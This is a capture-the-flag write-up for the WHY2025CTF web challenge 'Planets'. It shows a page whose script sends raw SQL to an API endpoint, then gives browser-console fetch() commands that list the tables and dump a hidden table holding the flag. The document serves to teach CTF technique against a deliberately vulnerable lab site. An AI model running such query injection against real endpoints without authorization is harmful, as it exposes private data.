---
title: WHY2025CTF Planets
draft: false
tags:
  - Web
---
## Problem Description

I just started programming and created my first website, an overview of all the planets in our solar system. Can you check if I didn't leave any security issues in it?

## Solution

The website lists the planets of the solar system Mercury to Neptune. Below is a zoomed out view of the website.

![[Pasted image 20250811002404.png]]

Nothing on the website is selectable so I decided to open up the chrome devtools to see how the website is structured. When analyzing the elements tab of the devtools, the script section shows how the data is being acquired and displayed. It is using a fetch and the body of the fetch is using mySQL to query the database. With the data acquired, a Javascript function `addPlanets` dynamically creates a layout of the data. Below is the script section of the website.

```

        try {
            fetch("/api.php", {
                method: "POST",
                body: "query=SELECT * FROM planets",
                headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
            })
            .then(response => response.json())
            .then(response => addPlanets(response))
        } catch (error) {
            console.error(error.message);
        }
        
	function addPlanets(planets){

            let container  = document.getElementById("container");
            for (planet in planets){
                let div = document.createElement("div");
                div.classList = "planet";
    
                let h2 = document.createElement("h2");
                h2.textContent = planets[planet].name;
    
                let img = document.createElement("img");
                img.src = "images/" + planets[planet].image;
                img.alt = planets[planet].name;
    
                let p = document.createElement("p");
                p.textContent = planets[planet].description;
    
                div.appendChild(h2);
                div.appendChild(img);
                div.appendChild(p);
                container.appendChild(div);
            }
	}
    
```

A glaring weakness is the mySQL code being exposed because I can call the `fetch()` method in the devtools console and manipulate the SQL query to whatever I please. I tested this by running the following command on the console.

```
fetch("https://planets.ctf.zone/api.php", {
    method: "POST",
    body: "query=SHOW TABLES;",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    }
})
.then(response => response.text()) // or use .json() if the server returns JSON
.then(data => console.log(data))
.catch(error => console.error("Error:", error));
```

I changed the SQL query to show all tables in the database and the output revealed a second table.

```
[{"Tables_in_planets":"abandoned_planets"},{"Tables_in_planets":"planets"}]
```

There is another table called `abandoned_planets` so I ran the fetch command to query and examine what is inside that table

```
fetch("https://planets.ctf.zone/api.php", {
    method: "POST",
    body: "query=SELECT * FROM abandoned_planets;",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    }
})
.then(response => response.text()) // or use .json() if the server returns JSON
.then(data => console.log(data))
.catch(error => console.error("Error:", error));
```

The output is the following.

```
[{"id":1,"name":"Pluto","image":"pluto.png","description":"Have you heard about Pluto? That's messed up right? flag{9c4dea2d8ae5681a75f8e670ac8ba999}"}]
```

The second table contains the flag! To see a nice visual of the flag on the website, run the `addPlanets()` function with the output above as the input to the function. This will populate the website and display another additional planet at the bottom.

![[Pasted image 20250811003717.png]]